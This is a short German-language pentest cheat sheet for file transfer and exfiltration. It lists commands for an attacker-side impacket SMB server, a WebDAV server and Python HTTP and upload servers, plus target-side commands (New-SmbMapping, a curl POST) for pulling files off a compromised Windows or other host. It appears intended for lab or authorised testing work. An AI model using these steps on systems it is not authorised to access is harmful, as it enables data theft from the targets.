 
 #exfil #transfer
 
---
## Windows

### SMB Share

**Angreifer**
Einen share auf port 445 erstellen. **Zugangsdaten werden ab Smbv2 benötigt!** 

```bash
sudo impacket-smbserver -username pwn -password pwn -debug -smb2support -ip LHOST SHARENAME /local/path/share
```

**Zielsystem**
Ein neues Smbmapping unter `P:` erstellen:

```powershell
New-SmbMapping -LocalPath 'P:' -RemotePath \\RHOST\SHARENAME -username pwn -password pwn
```

Dateien können per `cp path/soruce path/dest` kopiert werden. Mit Zugriff per RDP kann der Share auch über den File Explorer benutzt werden.

### WebDAV

**Angreifer**
Einen WebDAV Server mit anonymous login im momentanen Ordner auf allen Interfaces und Port 80 starten.

```bash
~/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root $(pwd)
```

---

## Universal

### Python simple http.server

Dateien können auf dem System gehostet werden wenn Phyton installiert ist

```bash
# Den momentanen Ordner bereitstellen
python3 -m http.server
# Spezifischen Pfad bereitstellen
python3 -m http.server -d /path/dir
```

### Python upload server

Falls ein bereitstellen der Daten per http nicht funktioniert können diese auch an einen Server hochgeladen werden.

**Angreifer**
Python server starten

```bash
python -m uploadserver -d /path/exfil
```

**Zielsystem**
Dateien per curl an den upload Server posten

```bash
curl -X POST http://127.0.0.1:8000/upload -F 'files=@multiple-example-1.txt' -F 'files=@multiple-example-2.txt'
```

## Todo

- [ ] Datentransfer
- [x] SMB Share
- [?] WebDAV
	- [?] WebDAV: Zielsystem fehlt
- [x] Python simple http.server ✅ 2024-07-26
- [?] Python uploadserver
	- [?] Python uploadserver: Powershell Beispiel